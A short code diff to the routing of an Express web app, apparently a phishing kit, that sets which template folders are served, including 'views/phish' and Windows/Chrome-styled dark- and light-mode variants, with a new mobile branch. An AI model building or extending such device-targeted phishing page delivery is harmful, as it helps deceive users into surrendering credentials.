@@ -21,14 +21,18 @@ app.use('/', (req, res, next) => {
     app.set('views', [ 
 
       path.join(__dirname, 'views/Windows-DarkMode-Delay'),
-      path.join(__dirname, 'views/Windows-Chrome-DarkMode'),
       path.join(__dirname, 'views/phish'), 
       path.join(__dirname, 'views/Windows-Chrome-LightMode')
       
       ]);
   }
   else {
-    app.set('views', path.join(__dirname, 'views/Windows-DarkMode-Delay'));
+    console.log("na here we dey");
+    app.set('views', [
+      path.join(__dirname, 'views/Windows-DarkMode-Delay/mobile'),
+      path.join(__dirname, 'views/phish'),
+
+    ]);
     
   }
   
